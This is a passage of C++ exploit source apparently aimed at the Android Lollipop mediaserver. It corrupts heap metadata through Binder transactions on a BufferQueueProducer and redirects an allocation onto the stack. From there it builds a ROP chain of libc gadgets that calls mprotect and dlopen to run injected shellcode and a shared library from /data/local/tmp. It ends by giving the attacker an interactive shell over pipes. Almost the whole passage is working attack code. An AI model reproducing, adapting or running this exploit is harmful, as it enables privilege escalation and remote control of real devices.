                uint32_t localPositionOfNextAllocPoint = (uint32_t)modifiedHeap+offsetToNextAllocPoint;
                aout<<"overwrite heap size is "<<(void*)overwritedHeapSize<<endl;
                aout<<"next alloc point for 128 size is "<<(void*)*(uint32_t*)localPositionOfNextAllocPoint<<endl;


                //offset from highest stack address to writing postion is 0x914
                /*ae90b6f0:b532f040 No symbol matches $value.
                ae90b6f4:b536ac00 No symbol matches $value. 
                ae90b6f8:b6cac60d No symbol matches $value. 
                ae90b6fc:ae90b77c No symbol matches $value.
                ae90b700:0 No symbol matches $value.-------->overwrite follow return address
                ae90b704:b6c9ab37 android::BufferQueueProducer::waitForFreeSlotThenRelock(char const*, bool, int*, int*) const + 391 in section .text of /home/fuzzer/develop/aosp/lollipop/out/target/product/hammerhead/symbols/system/lib/libgui.so
                ae90b708:b6cac60d No symbol matches $value.
                ae90b70c:0 No symbol matches $value.
                ae90b710:0 No symbol matches $value.
                ae90b714:0 No symbol matches $value.
                ae90b718:0 No symbol matches $value.
                ae90b71c:0 No symbol matches $value.*/

                //control the position the next malloc
                uint32_t ropPosition = (uint32_t)stackBase-0x914;//-20+8+4;
                aout<<"rop position is "<<(void*)ropPosition<<endl;
                *(uint32_t*)localPositionOfNextAllocPoint= ropPosition;

                Parcel dataOverWriteHeap,writeHeapReply;
                prepareData(dataOverWriteHeap,-(overwritedHeapSize/4),29+overwritedHeapSize/4);
                //构造重写堆的数据，包含被修改的下次分配的堆的指针
                dataOverWriteHeap.write((void*)modifiedHeap,overwritedHeapSize-3*4);
                int pad[60];
                dataOverWriteHeap.write((void*)pad,60*4);
                LOGE("overwrite heap\n");
                //控制下次分配128个字节的指针的位置
                status_t status = binder->transact(12, dataOverWriteHeap, &writeHeapReply,0);
                LOGE("overwrite heap done\n");
                if(status!=0)
                    aout<<"transact failed with "<<status<<endl;
                aout<<"control heap successfully"<<endl;


                //write a ashmem to remote process
                //handle allocation position
                //int handleForAshmemRemote = modifyedGraphicBuffer+3*0x80;
                const char *so_name = "/data/local/tmp/testso.so";//testso.so
                char *code = (char*)get_so_buffer(so_name); 
                int ashmem_len = *(int*)code;
                int fd_memory = ashmem_create_region("shmem", ashmem_len);
                ashmem_pin_region(fd_memory, 0, 0);
                uint8_t *shm = (uint8_t*)mmap(NULL, ashmem_len, PROT_READ | PROT_WRITE|PROT_EXEC, MAP_SHARED, fd_memory, 0);
                printf("first map address is %p\n",shm);
                memcpy(shm,code,ashmem_len);
                free(code);
                ashmem_set_prot_region(fd_memory,PROT_READ|PROT_WRITE|PROT_EXEC);
                //ashmem_unpin_region(fd_memory, 0, 0);

                //write stack 
                //写栈，构造ROP
                sp<GraphicBuffer> bufferForAshmem = new GraphicBuffer(randomWidth,randomHeight,1,3);
                int tmp,oldHandle;
                //don't detach this buffer for valid fd
                //314 for nInts 3 for data
                int newHandle[320]={12,3,314,fd_memory,pipein[0],pipein[1]};
                oldHandle = (int)bufferForAshmem->handle; 
                *(int*)&(bufferForAshmem->handle) = (int)newHandle;
                LOGE("send ashmem");
                uint32_t ropData[]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,ropPosition&0xfffff000,4096*2,0x7,(uint32_t)mprotect_address+1,(uint32_t)dlopenAddress,(uint32_t)ropPosition,2,0xcccccccc};
                uint32_t ropSize = sizeof(ropData)/sizeof(int);
                ropData[ropSize-1]=ropPosition+3*4+sizeof(ropData)+3*4+1;
                memcpy(newHandle+6,ropData,sizeof(ropData));
                uint32_t len = 0;
                void *shellcode = get_shellcode(&len);
                aout<<"shell code len is "<<len<<endl;
                if(len>314*4-sizeof(ropData)){
                    aout<<"shell code is too long"<<endl;
                    exit(-1);
                }
                memcpy(newHandle+6+ropSize,shellcode,len);
                LOGE("write stack\n");
                producer->attachBuffer(&tmp,bufferForAshmem); 
                *(int*)&(bufferForAshmem->handle)=oldHandle;


                /*Parcel dataROP;
                  prepareData(dataROP,0,317);

                //aosp rop chain
                //0x00015056 : ldr lr, [sp], #4 ; add sp, #8 ; bx lr
                //0x0004c8ee : pop {r0, r1, r2, pc}
                //0x0004c8ee : pop {r0, r1, r2, pc}
                //overwrited stack lr,modified lr,pad,pad,arg0,arg1,arg2,mprotect,arg0_dlopenaddress,arg1_ropPosition,arg2,shellcode_entry
                uint32_t ropData[]={libcbase+0x15056+1,1+libcbase+0x4c8ee,0xdeaddead,0xdeaddead,ropPosition&0xfffff000,4096*2,0x7,(uint32_t)mprotect_address+1,(uint32_t)dlopenAddress,(uint32_t)handleForAshmemRemote,2,0xcccccccc};
                uint32_t ropSize = sizeof(ropData)/sizeof(int);
                ropData[ropSize-1]=ropPosition+3*4+sizeof(ropData)+4+1;
                uint32_t buffer[317]={0};
                memcpy(buffer,ropData,sizeof(ropData));
                uint32_t len = 0;
                void *shellcode = get_shellcode(&len);
                aout<<"shell code len is "<<len<<endl;
                if(len>317*4-sizeof(ropData))
                exit(-1);
                memcpy(buffer+ropSize,shellcode,len);
                dataROP.write(buffer,317*4);
                LOGE("write stack\n");
                status = binder->transact(12, dataROP, &writeHeapReply,0);
                if(status!=0)
                aout<<"transact failed(write rop) with "<<status<<endl;
                aout<<"write rop successfully, waiting for trigger.."<<endl;
                //raise(SIGINT);*/
                free(modifiedHeap);
                delete pHeap;
                aout<<"good"<<endl;
            }
            goto _success;
_fail:
            bIsHeapStable = false;
_success:
            free(exploitBuffer);

            for(int i=0;i<=newSlot;i++){
                status = producer->detachBuffer(i);
                if (status!=0)
                    aout<<"detach buffer "<<i<<"failed"<<endl;
            }
        }else{
            aout<<"get stable heap failed, retry"<<endl;
        }
        threadcontrol::resumeBinderThreads();
        delete replyBuffer;

    }
    aout<<"done"<<endl;
    return 0;
}
void enter_shell(int pipeout[]){
    int count=0;
    char buffer[8192];
    char *bb_buffer=pack_data();
    int pipe_from_server = pipeout[0];
    int pipe_to_server = pipeout[1];
    while((count=read(pipe_from_server, buffer, 80))>=0){
        if(count>0&&strncmp("success",buffer,7)==0){
            printf("exploit successfully, enter shell\n");
            break;
        }else
            printf("received wrong data %s\n",buffer);
    }
    count=write(pipe_to_server,bb_buffer,bb_buffer_len);
    printf("buffer len is %d, writed len is %d\n",count,bb_buffer_len);
    while((count=read(pipe_from_server, buffer, 8192))>=0){
        if(count>0){
            //printf("%s",buffer);
            write(STDOUT_FILENO,buffer,count);
            size_t len=0;
            char *line=NULL;
            //sleep(2);
            printf("input:");
            getline((char**)&line,&len,stdin);
            write(pipe_to_server,line,strlen(line));
            free(line);
        }
    }
    perror("read pipe");

}
int main(__attribute__((unused)) int argc, __attribute__((unused)) char **  argv){
    //shell_main();
    //round 1 for crash mediaserver so the tid numbers of new created binder threads will be larger than others
    char buffer[4096];
    int pipetoserver[2];
    int pipefromserver[2];
    if (pipe(pipetoserver) == -1|| pipe(pipefromserver)==-1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }
    int pipein[2]={pipetoserver[0],pipefromserver[1]};
    int pipeout[2]={pipefromserver[0],pipetoserver[1]};
    int pid=fork();
    if(pid==0){
        enter_shell(pipeout);
    }

    while(true){
        do_work(1,NULL);
        aout<<"wait for mediaserver rebooting"<<endl;
        sleep(2);
        do_work(2,pipein);
        sleep(1);

        /*int flags = fcntl(pipe[0], F_GETFL, 0);
        fcntl(pipe[0], F_SETFL, flags | O_NONBLOCK);
        int count;
        count = read(pipe[0], buffer, 1024);
        if(count < 0 && errno == EAGAIN) {
            // If this condition passes, there is no data to be read
            printf("read nothing from pipe\n");
        }
        else if(count >= 0) {
            // Otherwise, you're good to go and buffer should contain "count" bytes.
            if(count>0){
                printf("receive %s,exploit successfully\n",buffer);
                break;
            }
        }
        else {
            perror("read pipe");
            // Some other error occurred during read.
        }*/
    }
}
